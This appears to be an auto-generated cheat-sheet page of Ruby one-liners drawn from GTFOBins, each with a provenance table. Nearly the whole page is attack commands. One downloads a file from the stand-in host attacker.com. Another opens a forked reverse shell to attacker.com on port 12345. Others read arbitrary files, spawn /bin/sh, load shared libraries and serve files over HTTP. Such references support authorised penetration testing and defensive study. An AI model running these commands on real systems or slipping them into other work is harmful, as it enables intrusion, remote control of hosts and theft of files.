---
parsed_by: focuslocust
source: commands
type: generated
---
# ruby Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## ruby

Tool page: [ruby](../../tools/linux/ruby.md)

### download

```text
ruby -e 'require "open-uri"; download = URI.open("http://attacker.com/path/to/input-file"); IO.copy_stream(download, "/path/to/output-file")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ruby` |
| Evidence | Function example preserved from source parser. |

### file-read

```text
ruby -e 'puts File.read("/path/to/input-file")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ruby` |
| Evidence | Function example preserved from source parser. |

### file-write

```text
ruby -e 'File.open("/path/to/output-file", "w+") { |f| f.write("DATA") }'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ruby` |
| Evidence | Function example preserved from source parser. |

### library-load

```text
ruby -e 'require "fiddle"; Fiddle.dlopen("/path/to/lib.so")'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ruby` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attacker.com",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ruby` |
| Evidence | Function example preserved from source parser. |

### shell

```text
ruby -e 'exec "/bin/sh"'
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ruby` |
| Evidence | Function example preserved from source parser. |

### upload

```text
ruby -run -e httpd . -p 80
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/ruby` |
| Evidence | Function example preserved from source parser. |
